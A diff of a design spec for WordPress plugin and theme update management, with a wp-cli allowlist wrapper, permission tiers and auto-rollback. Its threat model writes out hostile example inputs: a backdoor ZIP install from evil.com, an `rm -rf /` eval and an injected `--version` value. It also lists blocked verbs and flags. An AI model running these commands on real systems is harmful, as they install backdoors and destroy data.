@@ -1,27 +1,53 @@
-# Feature #4 — Full Plugin/Update Management + Safe-Update: Design Spec
+# Feature #4 — Plugin/Update Management + Safe-Update: Design Spec
 
-**Status:** Draft · **Effort:** M (+S safe-update) · **Date:** 2026-06-23
-**Branch:** `control-panel-backend-install` (or branch from it)
+**Status:** Finalized (owner decisions resolved) · **Effort:** M (+S safe-update)
+**Originated:** 2026-06-23 · **Finalized:** 2026-06-24
+**Branch:** branch from `main` **after** feature #3 (Insights) merges (Insights is
+in flight on `control-panel-insights`). #4 consumes only the stable
+`plugins[]` / `themes[]` / `wp_core` fields of the insights contract, so it can be
+built in parallel against fixtures and wired to live data once #3 lands.
 **Stakes:** HIGH — this is the highest-care allowlist widening in the wave.
+
+---
+
+## 0. Resolved owner decisions (2026-06-24)
+
+These were the open items in the 2026-06-23 draft. They are now settled.
+
+| # | Decision | Resolution | Effect on this spec |
+|---|----------|-----------|---------------------|
+| 1 | Install new plugins/themes from the panel? | **No — drop the install feature entirely.** Owner: "ignore this plugin installer — pointless." Owners add plugins via wp-admin (the normal WP path); the panel manages what already exists. | `install` is removed from the wrapper verb allowlist, from `VIBE_OPS`, from the routers, and from the UI. ZIP-URL install is moot (the verb does not exist). The root surface shrinks. |
+| 2 | Auto-update default when unset? | **Off / opt-in.** Matches WP core; nothing updates unattended unless explicitly enabled per item. | Toggles default to "following WP default (off)"; core auto-updates stay at WP's `minor` unless changed. |
+| 3 | Operator vs admin tiers | **Operators may update everything, including core** (owner: "let core be updated"). Operator: activate / deactivate / update (plugin/theme/**core**) / auto-update toggle / safe-update / schedule. Admin: the two *irreversible-from-the-panel* actions — `delete` and standalone arbitrary-backup restore. (`install` removed.) | Tiers come from a single `WP_ACTION_TIERS` map (§3.5) — future-proof, one place to audit/adjust. **No behavior change** to the existing `updatesApply`: it is already `operatorProcedure` for both core and plugins, and stays that way. |
+| 4 | Who can run safe-update? | **Operators may.** Refined for least privilege: `safeUpdate` is an **operator** procedure; its auto-rollback restore runs as an **internal step of the compound job** (authorized by the safe-update gate), so the standalone "restore any backup" action **stays admin-only**. Operators get safe-update without widening who can trigger an arbitrary destructive restore. | §3.5, §4.4. |
+| 5 | TTFB regression threshold | **Hardcoded 3000 ms default, overridable** per site via `VIBE_SAFEUPDATE_TTFB_THRESHOLD_MS`. | §4.3. |
+| 6 | Scheduled auto-update cadence | **Off / Weekly / Daily.** | §3.7. |
+| 7 | Bulk "update all safely" sequencing | **Sequential**, one pre-run backup for the batch, stop on first failure. | §4.4. |
 
 ---
 
 ## 1. Context — what exists today
 
-### 1.1 Current wp exposure (exactly three forms)
+### 1.1 Current wp exposure (four exact forms)
 
-The panel's entire `wp` surface is locked to three exact strings inside
-`validate_wp_args` in `bin/vibe-panel-run` (lines 198–209):
+The panel's entire `wp` surface is locked to four exact strings inside
+`validate_wp_args` in `bin/vibe-panel-run` (the original three plus the feature-#3
+insights cron-trigger, which has already landed on `main`):
 
 ```sh
-"core update"
-"plugin update --all"
-"plugin list --update=available --format=json"
+"core update"                                  # updatesApply (core)
+"plugin update --all"                          # updatesApply (plugins)
+"plugin list --update=available --format=json" # updatesAvailable
+"cron event run vibe_insights_collect_cron"    # insightsRefresh (feature #3)
 ```
 
 Everything else — `eval`, `eval-file`, `db`, `shell`, `config`, `search-replace`,
 `plugin activate`, `plugin install`, `plugin delete`, theme operations — is
 explicitly rejected with `die "wp subcommand not allowed: wp $joined"`.
+
+**The wrapper rewrite (§3.2) MUST preserve all four existing forms byte-for-byte** —
+dropping `plugin list …` breaks the update count, and dropping the `cron event run`
+form breaks #3's on-demand refresh.
 
 In `control-panel/packages/api/src/core-bridge/exec.ts` these map to three
 `VIBE_OPS` entries:
@@ -34,6 +60,9 @@ wpPluginUpdates:   { argv: ["wp", "plugin", "list", "--update=available", "--for
 
 `updatesAvailable` (in `routers/updates.ts`) calls `wpPluginUpdates` to return a
 count; `updatesApply` starts a job for `wpCoreUpdate` or `wpPluginUpdateAll`.
+
+`plugin install` remains permanently blocked (owner decision #1) — it is never
+added to the allowlist.
 
 ### 1.2 Backup/restore/smoke primitives (already exist, not new)
 
@@ -54,8 +83,27 @@ The companion "Insights" plugin (`vibe-wp-insights.php`, specified in
 `wp-content/.vibe/insights.json` with the full plugin and theme inventory — slug,
 name, version, status (active/inactive/must-use/dropin), `update_available`,
 `new_version`, `auto_update`. The panel reads it via the `insights` op (a `cat`
-through the root boundary). Feature #4 consumes this data directly; it adds NO new
-`wp plugin list` call.
+through the root boundary) and parses it with `parse-insights.ts`. Feature #4
+consumes `insights.plugins[]`, `insights.themes[]`, and `insights.wp_core`
+directly; it adds NO new `wp plugin list` call.
+
+These fields are stable in the #3 contract regardless of how #3 resolves its own
+open decisions (e.g. dropping `_vuln_join_keys` — that block is for Extra E, not
+#4). So #4 is decoupled from #3's internal choices.
+
+**Current landing status (2026-06-24):** #3's data plumbing is already on `main` —
+`core-bridge/parse-insights.ts` (Zod schema + `parseInsights`), the
+`vibe-wp-insights.php` mu-plugin, the `insights` op in `bin/vibe` /
+`bin/vibe-panel-run` (`OP_ALLOWLIST`) / `exec.ts` `VIBE_OPS`, and an
+`insightsRefresh` op (`wp cron event run vibe_insights_collect_cron`). Only #3's
+tRPC router (`routers/insights.ts`) is not yet merged. Therefore #4 wires to **real**
+inventory (no fixture seam): it imports `Insights` + `parseInsights` from
+`parse-insights.ts` and adds a thin `core-bridge/insights.ts` read helper
+(`readInsights(installDir, env) → Insights | null`) that runs the existing
+`insights` op and parses it. #4 does **not** create or edit `routers/insights.ts`
+(that is #3's file) to avoid a merge collision; its only edits to shared files
+(`exec.ts` `VIBE_OPS`, `bin/vibe-panel-run`, the root router registration,
+`bin/vibe`) are additive.
 
 ---
 
@@ -66,13 +114,15 @@ through the root boundary). Feature #4 consumes this data directly; it adds NO n
 | Inventory source | `insights.json` drop-file (feature #3) | Already planned, zero new wp-cli exposure, richer data |
 | Per-item allowlist shape | Structured verb × slug regex, NOT a new flat string list | Exhaustive without requiring one string per future plugin; still validated at the wrapper |
 | Slug/version validation layer | Wrapper (`vibe-panel-run`) AND panel (`exec.ts`) | Defense-in-depth: distrust the panel; the wrapper is the root boundary |
-| `install` source | WordPress.org only (no ZIP URL) | A caller-supplied ZIP URL is a direct RCE vector |
-| Permission tiers | `activate`/`deactivate`/`update` = operator; `install`/`delete` + `core update` = admin | Matches the blast radius of each action |
+| Install new plugins/themes | **Not exposed** (owner decision #1) | Owners install via wp-admin; removing it shrinks the root surface and eliminates the ZIP-URL RCE class entirely |
+| Permission tiers | Operator: `activate`/`deactivate`/`update` (incl. core)/auto-update toggle/safe-update/schedule. Admin: `delete` + standalone restore. Driven by one `WP_ACTION_TIERS` map. | Operators own routine maintenance (incl. core, matching shipped behavior); admin owns only the actions with no panel-side undo (`install` is gone, so `delete` cannot be reversed from the panel) |
+| Safe-update tier | **operator** procedure; internal restore is a compound-job step (owner decision #4) | Operators can safe-update; standalone arbitrary-backup restore stays admin |
 | Safe-update flow | backup → update → smoke+TTFB → auto-restore | Assembled from existing ops; no new shell scripting |
 | Screenshot diff | Out of scope (later add-on) | HTTP+TTFB+smoke covers ~80% cheaply; headless Chromium is a separate effort |
-| Auto-update mechanism | WP's own `auto_update_plugins`/`auto_update_themes` options via `wp plugin auto-updates enable <slug>` | Uses the canonical WP mechanism; avoids inventing a parallel scheduler |
+| Auto-update mechanism | WP's own `auto_update_plugins`/`auto_update_themes` options via `wp plugin auto-updates enable/disable <slug>` | Uses the canonical WP mechanism; avoids a parallel scheduler |
+| Auto-update default | **Off / opt-in** (owner decision #2) | Matches WP core; nothing updates unattended unless enabled |
 | Scheduled updates | Ride the existing systemd-timer pattern (`backup-schedule-apply`) | One new `auto-update-schedule-apply` op; no new infrastructure |
-| Theme parity | Themes get full feature parity with plugins | Same verbs, same allowlist structure, same UI treatment |
+| Theme parity | Themes get full feature parity with plugins (minus install) | Same verbs, same allowlist structure, same UI treatment |
 
 ---
 
@@ -91,14 +141,14 @@ entirely supplied by the drop-file.
 ### 3.2 The structured wp allowlist (the highest-care change)
 
 Replace the three hardcoded strings in `validate_wp_args` with a structured
-two-layer check:
+two-layer check. **No `install` verb** (owner decision #1).
 
 **Allowed verbs** (exhaustive, no catch-all):
 
 | Namespace | Verbs |
 |-----------|-------|
-| `plugin` | `activate`, `deactivate`, `update`, `install`, `delete`, `auto-updates` |
-| `theme` | `activate`, `update`, `install`, `delete`, `auto-updates` |
+| `plugin` | `activate`, `deactivate`, `update`, `delete`, `auto-updates` |
+| `theme` | `activate`, `update`, `delete`, `auto-updates` |
 | `core` | `update`, `version` |
 
 **Slug argument rules** (when a verb takes one):
@@ -106,13 +156,14 @@ two-layer check:
 - Exactly one argument (no multi-slug glob expansion).
 - Must match the slug regex: `^[a-z0-9][a-z0-9-]{0,62}$` — lowercase alphanumeric
   and hyphens only, 1–63 characters. No `/`, no `.`, no `..`, no whitespace.
-- For `install`, the argument is the wordpress.org slug (same regex). Arbitrary
-  URLs are rejected (`case "$arg" in *://*) die ...`).
 - For `auto-updates`, a second argument of exactly `enable` or `disable` is
   required. The slug comes first, the subverb second.
 - For `core update` and `core version`: no free argument (the existing behavior).
-- An optional `--version=x.y.z` flag is allowed for `update` and `install`; the
-  value must match `^[0-9]+\.[0-9]+(\.[0-9]+)?(-[a-zA-Z0-9.]+)?$`.
+- An optional `--version=x.y.z` flag is allowed for `update` (plugin/theme) and
+  `core update`; the value must match `^[0-9]+\.[0-9]+(\.[0-9]+)?(-[a-zA-Z0-9.]+)?$`.
+- The URL guard in `validate_wp_slug` (`*://*` → die) is retained as
+  defense-in-depth even though no install verb exists, so a malformed slug that
+  looks like a URL is still rejected loudly.
 
 **Forbidden at the wrapper regardless of panel-side checks:**
 
@@ -121,32 +172,38 @@ two-layer check:
   `{`, `}`, `*`, `?`, `!`, or whitespace.
 - The verbs `eval`, `eval-file`, `db`, `shell`, `config`, `search-replace`,
   `option`, `user`, `site`, `import`, `export`, `scaffold`, `package`,
-  `server`, `cron` — blocked even if the panel somehow sends them.
+  `server`, `cron`, **`install`** — blocked even if the panel somehow sends them.
 
 **New `validate_wp_args` logic (pseudocode):**
 
 ```sh
 validate_wp_args() {
   # $1 = namespace, $2 = verb, $3 = optional slug/subverb, $4 = optional flag
+  # Fast-path: the pre-existing FIXED forms keep working byte-for-byte. This block
+  # MUST list every form already in the shipped wrapper so nothing regresses —
+  # the panel update/list forms AND the feature-#3 insights cron-trigger.
+  joined="$*"
+  case "$joined" in
+    "core update") return 0 ;;
+    "plugin update --all") return 0 ;;
+    "plugin list --update=available --format=json") return 0 ;;
+    "cron event run vibe_insights_collect_cron") return 0 ;;
+  esac
+  # Structured per-item forms (feature #4). `cron` is NOT a general namespace — only
+  # the one fixed cron form above is allowed; anything else under cron dies below.
   namespace="$1"; verb="$2"
   case "$namespace" in
     plugin|theme|core) ;;
     *) die "wp namespace not allowed: $namespace" ;;
   esac
   case "$namespace $verb" in
-    "plugin activate"|"plugin deactivate"|"plugin update"|"plugin install"|\
+    "plugin activate"|"plugin deactivate"|"plugin update"|\
     "plugin delete"|"plugin auto-updates"|\
-    "theme activate"|"theme update"|"theme install"|\
+    "theme activate"|"theme update"|\
     "theme delete"|"theme auto-updates"|\
     "core update"|"core version") ;;
     *) die "wp subcommand not allowed: wp $namespace $verb" ;;
   esac
-  # Legacy lock: keep old 3-form behavior for callers that still use it
-  # (wpPluginUpdateAll sends "plugin update --all"; handle as special case).
-  if [ "$namespace $verb" = "plugin update" ] && [ "${3:-}" = "--all" ]; then
-    [ $# -eq 3 ] || die "wp plugin update --all takes no other args"
-    return 0
-  fi
   # Slug argument (when expected)
   case "$namespace $verb" in
     "core update"|"core version")
@@ -168,7 +225,7 @@ validate_wp_args() {
   slug="${3:-}"
   [ -n "$slug" ] || die "wp $namespace $verb requires a slug argument"
   validate_wp_slug "$slug"
-  # Optional --version= for install/update
+  # Optional --version= for update only
   if [ $# -ge 4 ]; then
     validate_wp_version_flag "${4:-}"
     [ $# -le 4 ] || die "too many arguments for wp $namespace $verb"
@@ -180,7 +237,7 @@ validate_wp_args() {
 validate_wp_slug() {
   slug="$1"
   case "$slug" in
-    *://*) die "wp slug must not be a URL (no ZIP installs)" ;;
+    *://*) die "wp slug must not be a URL" ;;
     *[^a-z0-9-]*|''|"-"*) die "wp slug fails regex: $slug" ;;
   esac
   [ "${#slug}" -le 63 ] || die "wp slug too long: $slug"
@@ -204,13 +261,13 @@ validate_wp_version_flag() {
 
 Each new per-item action maps to a `VIBE_OPS` entry with `takesArg: true`.
 The panel side validates slug + verb before building argv; the wrapper revalidates.
+**No `wpPluginInstall` / `wpThemeInstall`** (owner decision #1).
 
 ```typescript
 // Per-item plugin ops
 wpPluginActivate:      { argv: ["wp", "plugin", "activate"],     stream: true,  takesArg: true }
 wpPluginDeactivate:    { argv: ["wp", "plugin", "deactivate"],   stream: true,  takesArg: true }
 wpPluginUpdate:        { argv: ["wp", "plugin", "update"],       stream: true,  takesArg: true }
-wpPluginInstall:       { argv: ["wp", "plugin", "install"],      stream: true,  takesArg: true }
 wpPluginDelete:        { argv: ["wp", "plugin", "delete"],       stream: true,  takesArg: true }
 wpPluginAutoUpdatesEnable:  { argv: ["wp", "plugin", "auto-updates", "enable"],  stream: false, takesArg: true }
 wpPluginAutoUpdatesDisable: { argv: ["wp", "plugin", "auto-updates", "disable"], stream: false, takesArg: true }
@@ -218,7 +275,6 @@ wpPluginAutoUpdatesDisable: { argv: ["wp", "plugin", "auto-updates", "disable"],
 // Per-item theme ops
 wpThemeActivate:       { argv: ["wp", "theme", "activate"],      stream: true,  takesArg: true }
 wpThemeUpdate:         { argv: ["wp", "theme", "update"],        stream: true,  takesArg: true }
-wpThemeInstall:        { argv: ["wp", "theme", "install"],       stream: true,  takesArg: true }
 wpThemeDelete:         { argv: ["wp", "theme", "delete"],        stream: true,  takesArg: true }
 wpThemeAutoUpdatesEnable:  { argv: ["wp", "theme", "auto-updates", "enable"],   stream: false, takesArg: true }
 wpThemeAutoUpdatesDisable: { argv: ["wp", "theme", "auto-updates", "disable"],  stream: false, takesArg: true }
@@ -248,7 +304,7 @@ function assertSlug(slug: string, label: string): void {
 This is defense-in-depth — the wrapper is authoritative, but catching bad input
 early gives a cleaner error message to the UI.
 
-### 3.5 Per-item router (`routers/plugins.ts` and `routers/themes.ts`)
+### 3.5 Per-item routers (`routers/plugins.ts` and `routers/themes.ts`)
 
 Two new routers, mirroring the shape of `routers/updates.ts`:
 
@@ -263,29 +319,83 @@ export const pluginsRouter = {
       return insights.plugins;
     }),
 
-  pluginActivate:   operatorProcedure ...  // wpPluginActivate
-  pluginDeactivate: operatorProcedure ...  // wpPluginDeactivate
-  pluginUpdate:     operatorProcedure ...  // wpPluginUpdate (also covered by safeUpdate)
-  pluginInstall:    adminProcedure    ...  // wpPluginInstall — admin-only
-  pluginDelete:     adminProcedure    ...  // wpPluginDelete  — admin-only
+  // Tier comes from WP_ACTION_TIERS via procedureFor() — no hardcoded tier per line.
+  pluginActivate:   procedureFor("plugin.activate")   ...  // wpPluginActivate
+  pluginDeactivate: procedureFor("plugin.deactivate") ...  // wpPluginDeactivate
+  pluginUpdate:     procedureFor("plugin.update")     ...  // wpPluginUpdate (also via safeUpdate)
+  pluginDelete:     procedureFor("plugin.delete")     ...  // wpPluginDelete  — resolves to admin
 
-  pluginAutoUpdate: operatorProcedure     // wpPluginAutoUpdatesEnable/Disable per toggle
+  pluginAutoUpdate: procedureFor("plugin.autoUpdate")     // enable/disable per toggle
     .input(z.object({ siteId: z.string(), slug: z.string(), enabled: z.boolean() }))
     ...
+
+  safeUpdate:       procedureFor("safeUpdate")        ...  // §4 — internal restore is a job step
 };
 ```
 
-Permission tiers:
-- **protected** (any authenticated user): list (read from insights)
-- **operator**: activate, deactivate, update, auto-update toggle
-- **admin**: install, delete, core update, safe-update
+#### Permission model — one centralized, auditable map (future-proof)
+
+Rather than scatter `operatorProcedure` / `adminProcedure` across handlers (where a
+miswired tier is easy to introduce and hard to audit), feature #4 defines a single
+source of truth that every router consults. Adjusting a tier or adding an action is
+a one-line, reviewable change — and the security review (§5.3) has exactly one place
+to read the whole policy.
+
+```typescript
+// control-panel/packages/api/src/core-bridge/wp-actions.ts
+export type Role = "viewer" | "operator" | "admin";
+
+// Minimum role required for each mutating wp action.
+export const WP_ACTION_TIERS = {
+  "plugin.activate":    "operator",
+  "plugin.deactivate":  "operator",
+  "plugin.update":      "operator",
+  "plugin.autoUpdate":  "operator",
+  "plugin.delete":      "admin",      // no panel-side re-install (install dropped)
+  "theme.activate":     "operator",
+  "theme.update":       "operator",
+  "theme.autoUpdate":   "operator",
+  "theme.delete":       "admin",
+  "core.update":        "operator",   // matches the shipped updatesApply tier
+  "safeUpdate":         "operator",   // the safe wrapper; restore is an internal step
+  "schedule.autoUpdate":"operator",
+} as const satisfies Record<string, Role>;
+
+// Roles are hierarchical (viewer < operator < admin), reusing the existing
+// requireRole() in procedures.ts. A helper maps a tier to the right procedure:
+export function procedureFor(action: keyof typeof WP_ACTION_TIERS) {
+  return WP_ACTION_TIERS[action] === "admin" ? adminProcedure : operatorProcedure;
+}
+```
+
+Resulting tiers:
+
+- **viewer / protected** (any authenticated user): read inventory, versions, health.
+- **operator**: activate, deactivate, update (plugin / theme / **core**), auto-update
+  toggle, **safe-update** (incl. core), scheduled-update config, "Update all" /
+  "Update all (safely)".
+- **admin**: the two actions with no panel-side undo — `delete` (plugin/theme) and
+  the standalone arbitrary-backup restore (`backupsRestore`, unchanged).
+
+(No `install` action exists at any tier.)
+
+**No change to the shipped `updatesApply`.** It is already `operatorProcedure` for
+both `core` and `plugins`; core stays operator. Reading the tier from
+`WP_ACTION_TIERS["core.update"]` keeps it consistent and makes a future change (if
+ever wanted) a single-line edit reviewed in one spot.
+
+**Rationale for the admin line.** With `install` removed, a panel `delete` cannot be
+reversed from the panel (only via wp-admin), and a standalone restore overwrites the
+live DB + content from an arbitrary snapshot. Those are the two irreversible-from-
+the-panel actions, so they carry the admin gate. Everything else is routine
+maintenance or runs behind the safe-update backup/rollback wrapper.
 
 ### 3.6 Auto-update toggles
 
 Each `plugins[]` entry in `insights.json` carries `auto_update: boolean | null`
-(null = WP default). The UI renders a per-row toggle. Toggling calls
-`wpPluginAutoUpdatesEnable` or `wpPluginAutoUpdatesDisable` with the slug. These are
-non-streaming (`stream: false`) — they complete quickly.
+(null = WP default = off, per decision #2). The UI renders a per-row toggle.
+Toggling calls `wpPluginAutoUpdatesEnable` or `wpPluginAutoUpdatesDisable` with the
+slug. These are non-streaming (`stream: false`) — they complete quickly.
 
 The site-wide `signals.auto_update_core` field from insights feeds a separate
 "WordPress core auto-updates" control (values: `minor`, `major`, `off`). This
@@ -297,7 +407,7 @@ translates to `WP_AUTO_UPDATE_CORE` constant manipulation — handled by
 A new `auto-update-schedule-apply` bin op (modeled on `backup-schedule-apply`)
 installs/removes a systemd timer (`vibe-wp-autoupdate-<slug>-<env>.timer`) that
 runs `./bin/vibe <env> wp plugin update --all` on a schedule. The panel exposes
-a "Scheduled plugin updates" control with options: Off / Weekly / Daily.
+a "Scheduled plugin updates" control: **Off / Weekly / Daily** (decision #6).
 
 This is the same systemd pattern already in production for backup and monitor.
 No new infrastructure needed; the timer runs the already-allowed
@@ -309,12 +419,48 @@ Every new panel→host capability = a new `bin/vibe` op + a `VIBE_OPS` entry in
 `exec.ts` + an allowlist token in `vibe-panel-run` with argument re-validation at
 the root boundary. This is non-negotiable for the wp allowlist widening.
 
+### 3.9 Future-proofing (designed-in extensibility)
+
+The point of the structured allowlist + centralized tier map is that the *next*
+features (#5 perf, Extra C security score, Extra E vuln radar) extend this surface
+without reopening the security design. The extension points are explicit:
+
+- **Adding a wp verb later is a fixed 6-step checklist** — not an ad-hoc change.
+  To add a verb (say `plugin verify-checksums`): (1) add the `namespace verb` arm to
+  the `case` in `validate_wp_args`; (2) add a `VIBE_OPS` entry; (3) add the
+  `OP_ALLOWLIST` token in `vibe-panel-run`; (4) add a `WP_ACTION_TIERS` entry; (5)
+  add positive + injection tests to the BATS suite; (6) re-run the §5.3 wrapper
+  security review for the delta. Document this checklist beside the `case` block so
+  no one widens the root surface informally. `eval` / `db` / `config` / `shell` /
+  `install` remain permanently off the table (§5.4).
+- **One tier map, hierarchical roles.** New actions add one line to
+  `WP_ACTION_TIERS`. If a finer-grained role is ever needed (e.g. a "maintainer"
+  between operator and admin), it is added once to the role enum + `requireRole`
+  ordering and the map values; handlers do not change. Tiers are never hardcoded per
+  handler.
+- **Version-pinned updates are already supported** (`--version=` on `update`). This
+  is the seam a later "roll forward/back to a specific version" or "staged update"
+  feature builds on — no new wrapper surface needed.
+- **Native WP mechanisms, not parallel ones.** Auto-updates use WP's own
+  `auto_update_plugins`/`auto_update_themes` options and `WP_AUTO_UPDATE_CORE`;
+  scheduling rides the existing systemd-timer pattern. Future WP behavior is
+  inherited rather than reimplemented.
+- **Persisted records follow the existing contract.** Any new durable state (e.g. a
+  safe-update job row, a schedule record) uses the existing Drizzle schema patterns
+  in `packages/db` and the insights `schema_version` discipline (degrade gracefully
+  on unknown versions), so schema evolution never hard-breaks the panel.
+- **Insights coupling stays minimal.** #4 reads only `plugins[]`, `themes[]`,
+  `wp_core`, and `signals.auto_update_core`. New insights fields are additive; #4 is
+  unaffected by them, and is unaffected by #3's own internal decisions.
+
 ---
 
 ## 4. Safe-update job
 
 The flagship of this feature: a single `safeUpdate` compound job that auto-restores
 on regression. Assembled entirely from existing ops; no new shell scripting.
+**Operator-accessible** (decision #4) — the auto-rollback restore is an internal
+step of this job, not the admin-gated standalone restore action.
 
 ### 4.1 Flow
 
@@ -334,7 +480,7 @@ safeUpdate(siteId, env, target)
   │
   ├─ 3. Verify
   │     3a. op: smoke          (doctor-runtime + HTTP 200 + FastCGI HIT + upload check)
-  │     3b. HTTP TTFB check    (inline curl: homepage + /wp-admin/; <3 s threshold)
+  │     3b. HTTP TTFB check    (inline curl: homepage + /wp-admin/; threshold from §4.3)
   │     all checks pass → 4a. success path
   │     any check fails → 4b. failure path
   │
@@ -343,7 +489,8 @@ safeUpdate(siteId, env, target)
   │      invalidate insights cache (stale until next cron write)
   │
   └─ 4b. Failure → Auto-restore
-         op: restore(backupId, --yes)
+         op: restore(backupId, --yes)   ← internal job step (authorized by safeUpdate's
+                                           operator gate, NOT the standalone admin restore)
          wait for completion
          re-run smoke (confirm restore succeeded)
          mark job "failed" + emit rollback receipt
@@ -366,19 +513,24 @@ streams live to the UI).
   `[restore]`, `[done]`) to the `LineStream` so the UI can display a timeline.
 - The backup step uses `runVibe(…, "backupLocal", …)` if R2 is not configured;
   it captures the backup path from stdout (`Backup written to <path>`).
-- The restore step re-uses `VIBE_OPS.restore` (which already appends `--yes`).
+- The restore step re-uses `VIBE_OPS.restore` (which already appends `--yes`). It is
+  reached only inside the compound job; the standalone `backupsRestore` procedure
+  stays `adminProcedure`.
 - The entire compound job has a single `timeoutMs` ceiling (suggest 45 minutes:
   15 backup + 10 update + 5 verify + 15 restore worst-case).
 
 ### 4.3 TTFB check (inline, no new op)
 
-The TTFB check in step 3b is a short curl inside the job runner:
+The TTFB check in step 3b is a short curl inside the job runner. The threshold is
+3000 ms by default, overridable per site via `VIBE_SAFEUPDATE_TTFB_THRESHOLD_MS`
+(decision #5):
 
 ```typescript
+const threshold = Number(env.VIBE_SAFEUPDATE_TTFB_THRESHOLD_MS ?? 3000);
 const start = Date.now();
 const res = await fetch(siteUrl + "/");
 const ttfb = Date.now() - start;
-if (!res.ok || ttfb > 3000) { /* trigger restore */ }
+if (!res.ok || ttfb > threshold) { /* trigger restore */ }
 ```
 
 This runs from the panel server (not from inside Docker), so it tests the real
@@ -391,10 +543,12 @@ network access.
 
 - **Per-item row action:** "Update safely" button on a plugin row → `safeUpdate`
   with `target = <slug>`.
-- **Bulk:** "Update all (safely)" button → `safeUpdate` with `target = "plugins"`
-  (or "core" + "plugins" sequentially).
-- Safe-update is admin-only (it runs a backup + restore; operators can update
-  without the safe wrapper via the regular `updatesApply`).
+- **Bulk:** "Update all (safely)" button → `safeUpdate` with `target = "plugins"`.
+  Bulk is **sequential**, one pre-run backup for the whole batch, **stop on first
+  failure** and auto-restore that batch (decision #7). Not one backup per plugin,
+  not parallel.
+- Safe-update is **operator-accessible** (decision #4). Operators may also update
+  without the safe wrapper via the regular `updatesApply`.
 
 ---
 
@@ -410,7 +564,8 @@ This is the same threat class as a sudo bypass.
 The existing three-form lock exists precisely because the authors did not want to
 enumerate a larger surface without a formal security review. This spec now provides
 that enumeration — and the implementation requires a **dedicated wrapper security
-review** before merge.
+review** before merge. Dropping `install` (decision #1) removes the single highest-
+risk verb (the ZIP-URL RCE class) from the surface entirely.
 
 ### 5.2 Threat model for the widened allowlist
 
@@ -420,11 +575,12 @@ review** before merge.
 | Supplying a `--path=/evil` to make wp-cli act on a different install | Explicit blocked-flag check in `validate_wp_args`: any arg starting with `--path`, `--url`, `--require`, or `--exec` is rejected |
 | Passing multiple slugs / glob expansion (`*`) | `validate_wp_slug` rejects `*`; the arg count check (`[ $# -le 3 ]`) prevents two slug args |
 | Activating a dangerous verb (`wp eval "system('rm -rf /')"`) | Verb allowlist is exhaustive and matched with `case ... esac`; no catch-all branch |
-| ZIP-URL install (`wp plugin install https://evil.com/backdoor.zip`) | `validate_wp_slug` rejects `://`; URL-scheme check is a separate guard |
+| ZIP-URL install (`wp plugin install https://evil.com/backdoor.zip`) | `install` is not an allowed verb at all (decision #1) — rejected at the namespace/verb `case`; the `validate_wp_slug` `://` guard is a second line of defense |
 | `--version=` injection (`--version=1.0;rm -rf /`) | `validate_wp_version_flag` parses only the value after `=` and requires it to match the semver pattern |
 | Panel bypassing the wrapper entirely | Not possible: the panel runs as `vibe-panel` (unprivileged); only `sudo -n <runner>` reaches root, and `<runner>` is the hard-coded wrapper binary |
 | Panel rewriting the wrapper binary | Wrapper is `root:root 0755` with `assert_root_owned` checks; `vibe-panel` cannot write it |
-| Operator escalating to admin op (install/delete) | Permission tier enforced at the tRPC procedure level (`adminProcedure` vs `operatorProcedure`) BEFORE the op reaches the wrapper |
+| Operator escalating to an admin op (`delete` / standalone restore) | Tier resolved from `WP_ACTION_TIERS` and enforced at the tRPC procedure level (`adminProcedure` via `procedureFor`) BEFORE the op reaches the wrapper; one map to audit |
+| Operator triggering an arbitrary destructive restore | Standalone `backupsRestore` stays `adminProcedure`; the only restore an operator can cause is safe-update's auto-rollback to the snapshot taken seconds earlier in the same job |
 
 ### 5.3 What the wrapper security review must cover
 
@@ -436,17 +592,19 @@ A reviewer independent of the implementation must:
    not just some.
 3. Confirm the blocked-flag check (`--path`, `--url`, etc.) fires before the slug
    check so a crafted `--path` cannot mask itself as a slug.
-4. Run the injection test suite (§10) against the deployed wrapper.
-5. Review any change to `OP_ALLOWLIST` and `FLAG_ALLOWLIST` for unintended surface.
+4. Confirm `install` (and every other excluded verb) is unreachable.
+5. Run the injection test suite (§10) against the deployed wrapper.
+6. Review any change to `OP_ALLOWLIST` and `FLAG_ALLOWLIST` for unintended surface.
 
-### 5.4 No `eval`, no `db`, no `config`, no `shell` — ever
+### 5.4 No `eval`, no `db`, no `config`, no `shell`, no `install` — ever
 
 These verbs are permanently blocked. They are not "deferred" — they are off the
 table. `eval` and `eval-file` would reduce the entire allowlist to a no-op.
 `db` gives direct SQL. `shell` is trivially `exec sh`. `config` reads/writes
 wp-config.php (secrets). `search-replace` can rewrite arbitrary DB content.
-If a future feature seems to need them, a dedicated out-of-band mechanism is
-required (not a wp-cli expansion).
+`install` is excluded by owner decision (#1) — a panel "upload ZIP" flow, if ever
+wanted, requires a separate quarantine design (signature + scan + manual approval),
+not a wp-cli expansion.
 
 ---
 
@@ -461,32 +619,35 @@ A table with one row per plugin from `insights.plugins[]`:
 | Name | `insights.plugins[].name` | With slug below in muted text |
 | Status | `insights.plugins[].status` | "Active" / "Inactive" / "Must-use" / "Drop-in" badge |
 | Version | `insights.plugins[].version` | Current; "→ 1.2.3" in amber when update available |
-| Auto-update | `insights.plugins[].auto_update` | Toggle (null = WP default = "following WP setting") |
+| Auto-update | `insights.plugins[].auto_update` | Toggle (null = WP default = off, per decision #2) |
 | Actions | — | Per-row dropdown: Activate / Deactivate / Update / Update safely / Delete |
 
 - Row with `update_available: true` gets an amber highlight.
 - "Must-use" and "Drop-in" rows suppress Activate/Deactivate (greyed out).
-- `install` is a separate "Add plugin" button above the table (admin-only), with a
-  slug input (free text, validated with `SLUG_RE` before submission).
-- A "Update all (safely)" primary button above the table triggers `safeUpdate` for
-  all plugins with `update_available: true`.
+- **No "Add plugin" button** (decision #1) — plugins are installed via wp-admin and
+  appear here on the next insights refresh. A short helper line can point owners to
+  wp-admin → Plugins → Add New.
+- `Delete` is admin-only (suppressed/greyed for non-admins).
+- A "Update all (safely)" primary button above the table triggers `safeUpdate`
+  (sequential, one batch backup) for all plugins with `update_available: true`.
 - A "Update all" secondary button triggers `wpPluginUpdateAll` (no rollback;
   operator-accessible).
 
 ### 6.2 Themes tab
 
-Identical structure. `activate` is present only on inactive themes (one active theme
-at a time). No `deactivate` (WP does not allow deactivating the active theme via
-wp-cli — panel hides/disables that action for the active theme). `delete` is
-admin-only, suppressed for the active theme.
+Identical structure, minus install. `activate` is present only on inactive themes
+(one active theme at a time). No `deactivate` (WP does not allow deactivating the
+active theme via wp-cli — the panel hides/disables that action for the active
+theme). `delete` is admin-only, suppressed for the active theme.
 
 ### 6.3 Core update card
 
 Lives in the existing Updates section (or a "WordPress Core" card). Shows current
 version from `insights.wp_core.version` and new version from
 `insights.wp_core.new_version`. Buttons: "Update" (operator, current `wpCoreUpdate`)
